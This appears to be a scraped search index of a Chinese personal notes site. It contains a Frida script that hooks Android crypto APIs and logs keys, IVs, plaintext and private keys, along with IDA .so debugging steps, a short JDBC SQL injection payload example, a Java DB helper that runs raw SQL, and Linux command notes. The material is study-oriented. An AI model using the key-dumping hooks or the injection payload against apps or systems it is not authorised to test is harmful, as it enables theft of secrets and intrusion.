stringToHex(str) { var val = \u0026#34;\u0026#34;; for (var i = 0; i \u0026lt; str.length; i++) { if (val == \u0026#34;\u0026#34;) val = str.charCodeAt(i).toString(16); else val += str.charCodeAt(i).toString(16); } return val } function stringToBytes(str) { var ch, st, re = []; for (var i = 0; i \u0026lt; str.length; i++) { ch = str.charCodeAt(i); st = []; do { st.push(ch \u0026amp; 0xFF); ch = ch \u0026gt;\u0026gt; 8; } while (ch); re = re.concat(st.reverse()); } return re; } //将byte[]转成String的方法 function bytesToString(arr) { var str = \u0026#39;\u0026#39;; arr = new Uint8Array(arr); for (var i in arr) { str += String.fromCharCode(arr[i]); } return str; } function bytesToBase64(e) { var r, a, c, h, o, t; for (c = e.length, a = 0, r = \u0026#39;\u0026#39;; a \u0026lt; c;) { if (h = 255 \u0026amp; e[a++], a == c) { r += base64EncodeChars.charAt(h \u0026gt;\u0026gt; 2), r += base64EncodeChars.charAt((3 \u0026amp; h) \u0026lt;\u0026lt; 4), r += \u0026#39;==\u0026#39;; break } if (o = e[a++], a == c) { r += base64EncodeChars.charAt(h \u0026gt;\u0026gt; 2), r += base64EncodeChars.charAt((3 \u0026amp; h) \u0026lt;\u0026lt; 4 | (240 \u0026amp; o) \u0026gt;\u0026gt; 4), r += base64EncodeChars.charAt((15 \u0026amp; o) \u0026lt;\u0026lt; 2), r += \u0026#39;=\u0026#39;; break } t = e[a++], r += base64EncodeChars.charAt(h \u0026gt;\u0026gt; 2), r += base64EncodeChars.charAt((3 \u0026amp; h) \u0026lt;\u0026lt; 4 | (240 \u0026amp; o) \u0026gt;\u0026gt; 4), r += base64EncodeChars.charAt((15 \u0026amp; o) \u0026lt;\u0026lt; 2 | (192 \u0026amp; t) \u0026gt;\u0026gt; 6), r += base64EncodeChars.charAt(63 \u0026amp; t) } return r } function base64ToBytes(e) { var r, a, c, h, o, t, d; for (t = e.length, o = 0, d = []; o \u0026lt; t;) { do r = base64DecodeChars[255 \u0026amp; e.charCodeAt(o++)]; while (o \u0026lt; t \u0026amp;\u0026amp; r == -1); if (r == -1) break; do a = base64DecodeChars[255 \u0026amp; e.charCodeAt(o++)]; while (o \u0026lt; t \u0026amp;\u0026amp; a == -1); if (a == -1) break; d.push(r \u0026lt;\u0026lt; 2 | (48 \u0026amp; a) \u0026gt;\u0026gt; 4); do { if (c = 255 \u0026amp; e.charCodeAt(o++), 61 == c) return d; c = base64DecodeChars[c] } while (o \u0026lt; t \u0026amp;\u0026amp; c == -1); if (c == -1) break; d.push((15 \u0026amp; a) \u0026lt;\u0026lt; 4 | (60 \u0026amp; c) \u0026gt;\u0026gt; 2); do { if (h = 255 \u0026amp; e.charCodeAt(o++), 61 == h) return d; h = base64DecodeChars[h] } while (o \u0026lt; t \u0026amp;\u0026amp; h == -1); if (h == -1) break; d.push((3 \u0026amp; c) \u0026lt;\u0026lt; 6 | h) } return d } //stringToBase64 stringToHex stringToBytes //base64ToString base64ToHex base64ToBytes // hexToBase64 hexToBytes // bytesToBase64 bytesToHex bytesToString Java.perform(function () { var secretKeySpec = Java.use(\u0026#39;javax.crypto.spec.SecretKeySpec\u0026#39;); secretKeySpec.$init.overload(\u0026#39;[B\u0026#39;, \u0026#39;java.lang.String\u0026#39;).implementation = function (a, b) { showStacks(); var result = this.$init(a, b); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;算法名：\u0026#34; + b + \u0026#34;|str密钥:\u0026#34; + bytesToString(a)); console.log(\u0026#34;算法名：\u0026#34; + b + \u0026#34;|Hex密钥:\u0026#34; + bytesToHex(a)); return result; } var DESKeySpec = Java.use(\u0026#39;javax.crypto.spec.DESKeySpec\u0026#39;); DESKeySpec.$init.overload(\u0026#39;[B\u0026#39;).implementation = function (a) { showStacks(); var result = this.$init(a); console.log(\u0026#34;======================================\u0026#34;); var bytes_key_des = this.getKey(); console.log(\u0026#34;des密钥 |str \u0026#34; + bytesToString(bytes_key_des)); console.log(\u0026#34;des密钥 |hex \u0026#34; + bytesToHex(bytes_key_des)); return result; } DESKeySpec.$init.overload(\u0026#39;[B\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b) { showStacks(); var result = this.$init(a, b); console.log(\u0026#34;======================================\u0026#34;); var bytes_key_des = this.getKey(); console.log(\u0026#34;des密钥 |str \u0026#34; + bytesToString(bytes_key_des)); console.log(\u0026#34;des密钥 |hex \u0026#34; + bytesToHex(bytes_key_des)); return result; } var mac = Java.use(\u0026#39;javax.crypto.Mac\u0026#39;); mac.getInstance.overload(\u0026#39;java.lang.String\u0026#39;).implementation = function (a) { showStacks(); var result = this.getInstance(a); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;算法名：\u0026#34; + a); return result; } mac.update.overload(\u0026#39;[B\u0026#39;).implementation = function (a) { //showStacks(); this.update(a); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;update:\u0026#34; + bytesToString(a)) } mac.update.overload(\u0026#39;[B\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b, c) { //showStacks(); this.update(a, b, c) console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;update:\u0026#34; + bytesToString(a) + \u0026#34;|\u0026#34; + b + \u0026#34;|\u0026#34; + c); } mac.doFinal.overload().implementation = function () { //showStacks(); var result = this.doFinal(); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;doFinal结果: |str :\u0026#34; + bytesToString(result)); console.log(\u0026#34;doFinal结果: |hex :\u0026#34; + bytesToHex(result)); console.log(\u0026#34;doFinal结果: |base64 :\u0026#34; + bytesToBase64(result)); return result; } mac.doFinal.overload(\u0026#39;[B\u0026#39;).implementation = function (a) { //showStacks(); var result = this.doFinal(a); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;doFinal参数: |str :\u0026#34; + bytesToString(a)); console.log(\u0026#34;doFinal结果: |str :\u0026#34; + bytesToString(result)); console.log(\u0026#34;doFinal结果: |hex :\u0026#34; + bytesToHex(result)); console.log(\u0026#34;doFinal结果: |base64 :\u0026#34; + bytesToBase64(result)); return result; } var md = Java.use(\u0026#39;java.security.MessageDigest\u0026#39;); md.getInstance.overload(\u0026#39;java.lang.String\u0026#39;, \u0026#39;java.lang.String\u0026#39;).implementation = function (a, b) { //showStacks(); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;算法名：\u0026#34; + a); return this.getInstance(a, b); } md.getInstance.overload(\u0026#39;java.lang.String\u0026#39;).implementation = function (a) { //showStacks(); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;算法名：\u0026#34; + a); return this.getInstance(a); } md.update.overload(\u0026#39;[B\u0026#39;).implementation = function (a) { //showStacks(); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;update:\u0026#34; + bytesToString(a)) return this.update(a); } md.update.overload(\u0026#39;[B\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b, c) { //showStacks(); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;update:\u0026#34; + bytesToString(a) + \u0026#34;|\u0026#34; + b + \u0026#34;|\u0026#34; + c); return this.update(a, b, c); } md.digest.overload().implementation = function () { //showStacks(); console.log(\u0026#34;======================================\u0026#34;); var result = this.digest(); console.log(\u0026#34;digest结果:\u0026#34; + bytesToHex(result)); console.log(\u0026#34;digest结果:\u0026#34; + bytesToBase64(result)); return result; } md.digest.overload(\u0026#39;[B\u0026#39;).implementation = function (a) { //showStacks(); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;digest参数:\u0026#34; + bytesToString(a)); var result = this.digest(a); console.log(\u0026#34;digest结果:\u0026#34; + bytesToHex(result)); console.log(\u0026#34;digest结果:\u0026#34; + bytesToBase64(result)); return result; } var ivParameterSpec = Java.use(\u0026#39;javax.crypto.spec.IvParameterSpec\u0026#39;); ivParameterSpec.$init.overload(\u0026#39;[B\u0026#39;).implementation = function (a) { //showStacks(); var result = this.$init(a); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;iv向量: |str:\u0026#34; + bytesToString(a)); console.log(\u0026#34;iv向量: |hex:\u0026#34; + bytesToHex(a)); return result; } var cipher = Java.use(\u0026#39;javax.crypto.Cipher\u0026#39;); cipher.getInstance.overload(\u0026#39;java.lang.String\u0026#39;).implementation = function (a) { //showStacks(); var result = this.getInstance(a); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;模式填充:\u0026#34; + a); return result; } cipher.init.overload(\u0026#39;int\u0026#39;, \u0026#39;java.security.Key\u0026#39;).implementation = function (a, b) { //showStacks(); var result = this.init(a, b); console.log(\u0026#34;======================================\u0026#34;); if (N_ENCRYPT_MODE == a) { console.log(\u0026#34;init | 加密模式\u0026#34;); } else if(N_DECRYPT_MODE == a) { console.log(\u0026#34;init | 解密模式\u0026#34;); } var bytes_key = b.getEncoded(); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|str密钥:\u0026#34; + bytesToString(bytes_key)); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|Hex密钥:\u0026#34; + bytesToHex(bytes_key)); return result; } cipher.init.overload(\u0026#39;int\u0026#39;, \u0026#39;java.security.cert.Certificate\u0026#39;).implementation = function (a, b) { //showStacks(); var result = this.init(a, b); console.log(\u0026#34;======================================\u0026#34;); if (N_ENCRYPT_MODE == a) { console.log(\u0026#34;init | 加密模式\u0026#34;); } else if(N_DECRYPT_MODE == a) { console.log(\u0026#34;init | 解密模式\u0026#34;); } return result; } cipher.init.overload(\u0026#39;int\u0026#39;, \u0026#39;java.security.Key\u0026#39;, \u0026#39;java.security.spec.AlgorithmParameterSpec\u0026#39;).implementation = function (a, b, c) { //showStacks(); var result = this.init(a, b, c); console.log(\u0026#34;======================================\u0026#34;); if (N_ENCRYPT_MODE == a) { console.log(\u0026#34;init | 加密模式\u0026#34;); } else if(N_DECRYPT_MODE == a) { console.log(\u0026#34;init | 解密模式\u0026#34;); } var bytes_key = b.getEncoded(); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|str密钥:\u0026#34; + bytesToString(bytes_key)); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|Hex密钥:\u0026#34; + bytesToHex(bytes_key)); return result; } cipher.init.overload(\u0026#39;int\u0026#39;, \u0026#39;java.security.cert.Certificate\u0026#39;, \u0026#39;java.security.SecureRandom\u0026#39;).implementation = function (a, b, c) { //showStacks(); var result = this.init(a, b, c); if (N_ENCRYPT_MODE == a) { console.log(\u0026#34;init | 加密模式\u0026#34;); } else if(N_DECRYPT_MODE == a) { console.log(\u0026#34;init | 解密模式\u0026#34;); } return result; } cipher.init.overload(\u0026#39;int\u0026#39;, \u0026#39;java.security.Key\u0026#39;, \u0026#39;java.security.SecureRandom\u0026#39;).implementation = function (a, b, c) { //showStacks(); var result = this.init(a, b, c); if (N_ENCRYPT_MODE == a) { console.log(\u0026#34;init | 加密模式\u0026#34;); } else if(N_DECRYPT_MODE == a) { console.log(\u0026#34;init | 解密模式\u0026#34;); } var bytes_key = b.getEncoded(); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|str密钥:\u0026#34; + bytesToString(bytes_key)); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|Hex密钥:\u0026#34; + bytesToHex(bytes_key)); return result; } cipher.init.overload(\u0026#39;int\u0026#39;, \u0026#39;java.security.Key\u0026#39;, \u0026#39;java.security.AlgorithmParameters\u0026#39;).implementation = function (a, b, c) { //showStacks(); var result = this.init(a, b, c); if (N_ENCRYPT_MODE == a) { console.log(\u0026#34;init | 加密模式\u0026#34;); } else if(N_DECRYPT_MODE == a) { console.log(\u0026#34;init | 解密模式\u0026#34;); } var bytes_key = b.getEncoded(); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|str密钥:\u0026#34; + bytesToString(bytes_key)); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|Hex密钥:\u0026#34; + bytesToHex(bytes_key)); return result; } cipher.init.overload(\u0026#39;int\u0026#39;, \u0026#39;java.security.Key\u0026#39;, \u0026#39;java.security.AlgorithmParameters\u0026#39;, \u0026#39;java.security.SecureRandom\u0026#39;).implementation = function (a, b, c, d) { //showStacks(); var result = this.init(a, b, c, d); if (N_ENCRYPT_MODE == a) { console.log(\u0026#34;init | 加密模式\u0026#34;); } else if(N_DECRYPT_MODE == a) { console.log(\u0026#34;init | 解密模式\u0026#34;); } var bytes_key = b.getEncoded(); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|str密钥:\u0026#34; + bytesToString(bytes_key)); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|Hex密钥:\u0026#34; + bytesToHex(bytes_key)); return result; } cipher.init.overload(\u0026#39;int\u0026#39;, \u0026#39;java.security.Key\u0026#39;, \u0026#39;java.security.spec.AlgorithmParameterSpec\u0026#39;, \u0026#39;java.security.SecureRandom\u0026#39;).implementation = function (a, b, c, d) { //showStacks(); var result = this.update(a, b, c, d); if (N_ENCRYPT_MODE == a) { console.log(\u0026#34;init | 加密模式\u0026#34;); } else if(N_DECRYPT_MODE == a) { console.log(\u0026#34;init | 解密模式\u0026#34;); } var bytes_key = b.getEncoded(); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|str密钥:\u0026#34; + bytesToString(bytes_key)); console.log(\u0026#34;init key:\u0026#34; + \u0026#34;|Hex密钥:\u0026#34; + bytesToHex(bytes_key)); return result; } cipher.update.overload(\u0026#39;[B\u0026#39;).implementation = function (a) { //showStacks(); var result = this.update(a); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;update:\u0026#34; + bytesToString(a)); return result; } cipher.update.overload(\u0026#39;[B\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b, c) { //showStacks(); var result = this.update(a, b, c); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;update:\u0026#34; + bytesToString(a) + \u0026#34;|\u0026#34; + b + \u0026#34;|\u0026#34; + c); return result; } cipher.doFinal.overload().implementation = function () { //showStacks(); var result = this.doFinal(); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;doFinal结果: |str :\u0026#34; + bytesToString(result)); console.log(\u0026#34;doFinal结果: |hex :\u0026#34; + bytesToHex(result)); console.log(\u0026#34;doFinal结果: |base64 :\u0026#34; + bytesToBase64(result)); return result; } cipher.doFinal.overload(\u0026#39;[B\u0026#39;).implementation = function (a) { //showStacks(); var result = this.doFinal(a); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;doFinal参数: |str :\u0026#34; + bytesToString(a)); console.log(\u0026#34;doFinal结果: |str :\u0026#34; + bytesToString(result)); console.log(\u0026#34;doFinal结果: |hex :\u0026#34; + bytesToHex(result)); console.log(\u0026#34;doFinal结果: |base64 :\u0026#34; + bytesToBase64(result)); return result; } var x509EncodedKeySpec = Java.use(\u0026#39;java.security.spec.X509EncodedKeySpec\u0026#39;); x509EncodedKeySpec.$init.overload(\u0026#39;[B\u0026#39;).implementation = function (a) { //showStacks(); var result = this.$init(a); console.log(\u0026#34;======================================\u0026#34;); console.log(\u0026#34;RSA密钥:\u0026#34; + bytesToBase64(a)); return result; } var rSAPublicKeySpec = Java.use(\u0026#39;java.security.spec.RSAPublicKeySpec\u0026#39;); rSAPublicKeySpec.$init.overload(\u0026#39;java.math.BigInteger\u0026#39;, \u0026#39;java.math.BigInteger\u0026#39;).implementation = function (a, b) { //showStacks(); var result = this.$init(a, b); console.log(\u0026#34;======================================\u0026#34;); //console.log(\u0026#34;RSA密钥:\u0026#34; + bytesToBase64(a)); console.log(\u0026#34;RSA密钥N:\u0026#34; + a.toString(16)); console.log(\u0026#34;RSA密钥E:\u0026#34; + b.toString(16)); return result; } var KeyPairGenerator = Java.use(\u0026#39;java.security.KeyPairGenerator\u0026#39;); KeyPairGenerator.generateKeyPair.implementation = function () { //showStacks(); var result = this.generateKeyPair(); console.log(\u0026#34;======================================\u0026#34;); var str_private = result.getPrivate().getEncoded(); var str_public = result.getPublic().getEncoded(); console.log(\u0026#34;公钥 |hex\u0026#34; + bytesToHex(str_public)); console.log(\u0026#34;私钥 |hex\u0026#34; + bytesToHex(str_private)); return result; } KeyPairGenerator.genKeyPair.implementation = function () { //showStacks(); var result = this.genKeyPair(); console.log(\u0026#34;======================================\u0026#34;); var str_private = result.getPrivate().getEncoded(); var str_public = result.getPublic().getEncoded(); console.log(\u0026#34;公钥 |hex\u0026#34; + bytesToHex(str_public)); console.log(\u0026#34;私钥 |hex\u0026#34; + bytesToHex(str_private)); return result; } }); "},{"id":19,"href":"/docs/re/ida%E5%8A%A8%E8%B0%83so/","title":"ida 动态调试so","section":"re","content":"ida 动态调试 so文件\n在ida目录下有dbgsrv文件夹,选择合适的\n真机用android_server/android_server64,模拟器用android_x86_server/android_x64_server\nadb push android_x64_server /data/local/tmp 进入adb shell\nadb shell su chmod 777 /data/local/tmp/android_x64_server ./data/local/tmp/android_x64_server 转发端口，ida默认端口是23946\nadb forward tcp:23946 tcp:23946 手机/模拟器打开app\n方法1\n先打开so文件，debug-\u0026gt;Remote linux -\u0026gt;Process option 中host 127.0.0.1\n再attch附加\n方法2\n​\t打开需调试文件对应的ida,degun-\u0026gt;attch\n​\t模拟器选Remote linux,真机用Remote ARM android/Linux\n在列表中找到包名，可用快捷键ctrl+F 搜索\n打开后，在右侧 找到Module 找到so需调试的so文件，找不到的注意java代码中的，让他加载有就有了\nstatic { System.loadLibrary(\u0026#34;JniLib\u0026#34;); } 注: 在apk lib中有多个文件夹如v8,v7,x86,x84,如遇到ida 反编译不便解读，可尝试换不同的so文件\n"},{"id":20,"href":"/docs/learm/%E4%B8%8A%E8%AF%BE/java/","title":"java","section":"class notes","content":"\r数据类型\r#\r分为基本数据类型和引用数据类型\n基本数据类型分为数值型、浮点型、字符型、布尔型 引用数据类型：接口（interface）、数组、类（class）。\n程序结构\r#\r顺序结构 选择结构 if public static void main(String[] args) { int i=3; if (i\u0026gt;2) { System.out.println(\u0026#34;i\u0026gt;2\u0026#34;); }else { System.out.println(\u0026#34;i\u0026lt;=2\u0026#34;); } } switch 记得使用break\npublic static void main(String[] args) { int i=3; switch (i) { case 1: System.out.println(\u0026#34;1\u0026#34;); break; case 2: System.out.println(\u0026#34;2\u0026#34;); break; default: System.out.println(\u0026#34;其他\u0026#34;); break; } } 循环结构 for 循环 public static void main(String[] args) { for (int i = 1; i \u0026lt;= 9; i++) { System.out.println(i); } } while 循环 public static void main(String[] args) { int i=0; while (i\u0026lt;10) { System.out.println(i); i++; } } do while 循环 public static void main(String[] args) { int i=0; do { System.out.println(i); i++; } while (i\u0026lt;10); } 定义函数\r#\r这个简单吧， public 的意思就是公开的，谁都可以调用，更多的用处可以在后面的学习讲到 int 就是代表这个函数返回值的类型 add 就是函数名 (int x, int y) 括号里面就是参数, int x 整形的变量, 参数名为x, 同理y也是一样\n{}里面的就是函数体，如下就是对传进来的参数进行相加，并返回给调用方\npublic int add(int x, int y){ return x+y; } "},{"id":21,"href":"/docs/network-security/java/sql%E6%B3%A8%E5%85%A5/","title":"java sql 注入","section":"java","content":"\rJDBC sql注入\r#\rjdbc类似于url解析\n输入myapp#\u0026rsquo; union select 1#\njdbc:mysql://mysqldbserver:3360/myapp#\u0026#39; union select 1# 解析成下面 jdbc:mysql://mysqldbserver:3360/myapp 再代入sql语句\nselect * from user where name=\u0026#39;#\u0026#39; union select 1#\u0026#39; and pwd =\u0026#39;\u0026#34;+pwd+\u0026#34;\u0026#39; 第一个单引号包裹了，#成了字符串，第二个#注释后面\n"},{"id":22,"href":"/docs/code/java_mysql/","title":"Java_mysql","section":"code","content":"package cn.utils; import java.sql.*; public class DBconn { public static String url=\u0026#34;jdbc:mysql://localhost:3306/test\u0026#34;; public static String name=\u0026#34;root\u0026#34;; public static String pwd=\u0026#34;123456\u0026#34;; public static Connection conn=null; public static ResultSet rs=null; public static PreparedStatement ps=null; public static void init() { try{Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;);}catch (Exception e){ System.out.println(\u0026#34;加载失败\u0026#34;); e.printStackTrace(); } try { conn = DriverManager.getConnection(url,name,pwd); } catch (Exception e) { System.out.println(\u0026#34;init [SQL驱动程序初始化失败！]\u0026#34;); e.printStackTrace(); } } public static ResultSet SelectSql(String sql) { System.out.println(sql); try { ps = conn.prepareStatement(sql); rs = ps.executeQuery(sql); } catch (SQLException e) { System.out.println(\u0026#34;sql数据库查询异常\u0026#34;); e.printStackTrace(); } return rs; } public static int addUpdDel(String sql) { int i = 0; try { PreparedStatement ps = conn.prepareStatement(sql); i = ps.executeUpdate(); } catch (SQLException e) { System.out.println(\u0026#34;sql数据库增删改异常\u0026#34;); e.printStackTrace(); } return i; } public static void closeConn() { try { conn.close(); } catch (SQLException e) { System.out.println(\u0026#34;sql数据库关闭异常\u0026#34;); e.printStackTrace(); } } } "},{"id":23,"href":"/docs/learm/%E4%B8%8A%E8%AF%BE/linux/","title":"linux","section":"class notes","content":"hostname xxx #临时修改 hostnamectl xxx #永久生效 hostname #查看hostname uname -a # Linux 一些信息 目录\r#\rpwd #当前目录的完整路径 cd xx # 切换的xx 目录 (相对路径和绝对路径) ls ls [-aAdfFhilnrRSt] 文件名或目录名称.. ls [--color={never,auto,always}] 文件名或目录名称.. ls [--full-time] 文件名或目录名称.. -a\tall， 显示所有文件及目录 (. 开头的隐藏文件也会列出) -A\t同-a ，但不列出 “.” (目前目录) 及 “…” (父目录) -l\t以长格式显示目录下的内容列表，包括文件的权限、链接数、所有者名称和组所有者、文件大小、最后修改日期时间和文件/目录名称 -r\treverse，将排序结果反向输出，例如：原本文件名由小到大，反向则为由大到小 -R\t–recursive，连同子目录内容一起列出来，等于该目录下的所有文件都会显示出来 -S\tsort by file size。根据文件大小排序，而不是文件名 -t\tsort by modification time，以文件修改时间排序（从最新开始排） -d\t仅列出目录本身，而不是列出目录内的文件数据（常用） -f\t直接列出结果，而不进行排序 （ls 默认以文件名排序） -F\t根据文件、目录等信息，给予附加数据结构，例如：*:代表可可执行文件； /:代表目录； =:代表 socket 文件； |:代表 FIFO 文件 -g\t像-l，但是不列出所有者 -G,\tno-group, 不列出任何有关于组的信息 –author\t打印出每一个文件的作者 -n\t类似-l，用数字UID和GID代替名称 -h\t将文件大小以人类较易读的方式（例如 GB KB 等等）列 -c\t输出文件的ctime（文件状态最后更改的时间），并根据ctime排序 -C\t由上至下的列出项目 --full-time\t显示完整时间格式 --time\t输出 access 时间或改变权限属性时间 （ctime）而非内容变更时间 （modification time） --color=never\t不要依据文件特性给予颜色显示 --color=always\t显示颜色 cat cat #命令用于连接和打印文件内容，支持显示行号、非空行号、特殊字符等。常用参数包括： -n：显示行号，会在输出的每一行前加上行号。 -b：显示行号，但只对非空行进行编号。 -s：压缩连续的空行，只显示一个空行。 -E：在每一行的末尾显示$符号。 -T：将Tab字符显示为^I。 -v：显示一些非打印字符。 cat 反向输出 tac 组与用户\r#\r相关文件 # 用户配置文件 /etc/passwd #密码信息配置文件 /etc/shadow # 组信息配置文件 /etc/group # 系统用户组信息 /etc/group groupname:password:GID:user_list 组名 密码 GID 用户列表 # 用户组密码信息 /etc/gshadow 查询命令\r#\r# 查询当前登录用户信息 whoami # 查询指定用户信息 id username # 查询所有用户信息 cat /etc/passwd # 查询所有用户组信息 getent group # 查询用户所属的用户组 groups username # 查询用户的主用户组 id -g -n username 用户名令\r#\r创建用户 useradd [选项] name -c 指定一段注释性描述。 -d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。 -g 用户组 指定用户所属的用户组。 -G 用户组，用户组 指定用户所属的附加组。 -s Shell文件 指定用户的登录Shell。 -u 指定UID 设置密码 passwd [选项] name -d 清空密码 -l 锁定 -u 解锁 -S 查看锁定状态 修改用户属性 usermod [选项] name 删除用户账户 userdel name -r 删除账户并且将用户的宿主目录删除 组的命令\r#\r组的创建 groupadd [选项] groupname -g 指定GID创建用户组 组的删除 groupdel groupname 修改GID groupmod -g GID groupname 组添加用户 gpasswd [选项] 用户名 组名 -a 添加用户 -d 删除用户 -M 定义组内用户的列表 权限\r#\rLinux系统上对文件的权限有着严格的控制，如果想对某个文件执行某种操作，必须具有对应的权限方可执行成功。 Linux下文件的权限类型一般包括读，写，执行。对应字母为 r、w、x。 Linux下权限的粒度有 拥有者 、群组 、其它组 三种。每个文件都可以针对三个粒度，设置不同的rwx(读写执行)权限。通常情况下，一个文件只能归属于一个用户和组， 如果其它的用户想有这个文件的权限，则可以将该用户加入具备权限的群组，一个用户可以同时归属于多个组。 rwx 对于目录和文件的区别\n目录 r 读取目录内文件列表的权限 w 对目录内文件进行新建,删除,重命名等操作的权限 x 进入目录的权限 文件 r 读取文件内容的权限 w 修改文件内容的权限 x 执行该文件的权限 快速入门\r#\r更改文件权限 chmod\nchmod [可选项] \u0026lt;mode\u0026gt; \u0026lt;file…\u0026gt; [可选项] -c -f -v -R [mode] [ugoa...][[+-=][rwxX]...][,...] [ugoa...] u 表示该档案的拥有者， g 表示与该档案的拥有者属于同一个群体(group)者， o 表示其他以外的人， a 表示所有（包含上面三者）。 [+-=] + 表示增加权限，- 表示取消权限，= 表示唯一设定权限。 [rwxX] r 表示可读取， w 表示可写入， x 表示可执行， X 表示只有当该档案是个子目录或者该档案已经被设定过为可执行。 [file...] 文件列表（单个或者多个文件、文件夹） 设置所有用户可读取文件 a.conf chmod ugo+r a.conf 或 chmod a+r a.conf 设置 c.sh 只有 拥有者可以读写及执行 chmod u+rwx c.sh 设置文件 a.conf 与 b.xml 权限为拥有者与其所属同一个群组 可读写，其它组可读不可写 chmod a+r,ug+w,o-w a.conf b.xml 设置当前目录下的所有档案与子目录皆设为任何人可读写 chmod -R a+rw * 数字权限使用格式\r#\r在这种使用方式中，首先我们需要了解数字如何表示权限。 首先，我们规定 数字 4 、2 和 1表示读、写、执行权限（具体原因可见下节权限详解内容），即 r=4，w=2，x=1 。此时其他的权限组合也可以用其他的八进制数字表示出来，\n如：\nrwx = 4 + 2 + 1 = 7\nrw = 4 + 2 = 6\nrx = 4 +1 = 5\n即\n若要同时设置 rwx (可读写运行） 权限则将该权限位 设置 为 4 + 2 + 1 = 7\n若要同时设置 rw- （可读写不可运行）权限则将该权限位 设置 为 4 + 2 = 6\n若要同时设置 r-x （可读可运行不可写）权限则将该权限位 设置 为 4 +1 = 5\n上面我们提到，每个文件都可以针对三个粒度，设置不同的rwx(读写执行)权限。即我们可以用用三个8进制数字分别表示 拥有者 、群组 、其它组( u、 g 、o)的权限详情，并用chmod直接加三个8进制数字的方式直接改变文件权限。语法格式为 ：\nchmod \u0026lt;abc\u0026gt; file…\n其中 a,b,c各为一个数字，分别代表User、Group、及Other的权限。 相当于简化版的 chmod u=权限,g=权限,o=权限 file\u0026hellip; 而此处的权限将用8进制的数字来表示User、Group、及Other的读、写、执行权限\n设置所有人可以读写及执行 chmod 777 file (等价于 chmod u=rwx,g=rwx,o=rwx file 或 chmod a=rwx file) 设置拥有者可读写，其他人不可读写执行 chmod 600 file (等价于 chmod u=rw,g=---,o=--- file 或 chmod u=rw,go-rwx file ) 更改文件拥有者\r#\rlinux/Unix 是多人多工作业系统，每个的文件都有拥有者（所有者），如果我们想变更文件的拥有者（利用 chown 将文件拥有者加以改变），一般只有系统管理员(root)拥有此操作权限，而普通用户则没有权限将自己或者别人的文件的拥有者设置为别人。\nchown [可选项] user[:group] file…\n使用权限：root 说明： [可选项] : 同上文chmod user : 新的文件拥有者的使用者 group : 新的文件拥有者的使用者群体(group) 设置文件 d.key、e.scrt的拥有者设为 users 群体的 tom chown tom:users file d.key e.scrt 设置当前目录下与子目录下的所有文件的拥有者为 users 群体的 James chown -R James:users * ACL\r#\rACL的全称是 Access Control List (访问控制列表) ，一个针对文件/目录的访问控制列表。它在UGO权限管理的基础上为文件系统提供一个额外的、更灵活的权限管理机制。它被设计为UNIX文件权限管理的一个补充。ACL允许你给任何的用户或用户组设置任何文件/目录的访问权限。\nsetfacl\nsetfacl [-bkRd] [{-m|-x} acl参数] 文件/目录名 -m ：配置后面的 acl 参数给文件/目录使用，不可与 -x 合用; -x ：删除后续的 acl 参数，不可与 -m 合用; -b ：移除所有的 ACL 配置参数; -k ：移除默认的 ACL 参数; -R ：递归配置 acl; -d ：配置“默认 acl 参数”，只对目录有效，在该目录新建的数据会引用此默认值; getfacl\ngetfacl 文件/目录名 为 tester 用户赋予读写 aclfile 文件的权限：\nsetfacl -m u:tester:rw aclfile getfacl aclfile "},{"id":24,"href":"/docs/code/linux/screen/","title":"linux screen","section":"linux","content":"screen 是一个非常有用的终端管理工具，可以让你在断开连接后继续运行程序，并且支持多个会话和窗口。以下是一些常用的 screen 操作和命令：\n启动\nscreen 指定会话\nscreen -S my_session 退出 screen 会话但保持进程运行：使用 Ctrl+A 然后按 D 来\u0026quot;detach\u0026quot;（断开）会话。这样你的会话和进程仍然在后台运行，但你可以退出当前终端。\n恢复一个 screen 会话： 当你重新连接到服务器时，可以通过以下命令恢复会话：\nscreen -r 如果有多个会话在运行，可以通过 -r 加会话 ID 或会话名称恢复特定会话：\nscreen -r my_session 查看当前正在运行的会话\nscreen -ls 这将列出所有正在运行的 screen 会话以及它们的 ID 和名称。\n终止一个 screen 会话： 在 screen 内按下 Ctrl+D 会结束当前会话。如果你只是想退出但不想结束会话，可以使用 Ctrl+A 然后按 D。\n多窗口操作\r#\rscreen 支持在同一个会话中创建多个窗口，就像在一个虚拟终端中有多个标签页一样。\n创建新窗口： 在 screen 会话中按 Ctrl+A 然后按 C（Create）。这将创建一个新的窗口，并让你在新的终端中工作。\n切换窗口：\n按 Ctrl+A 然后按 N，可以切换到下一个窗口。 按 Ctrl+A 然后按 P，可以切换到前一个窗口。 按 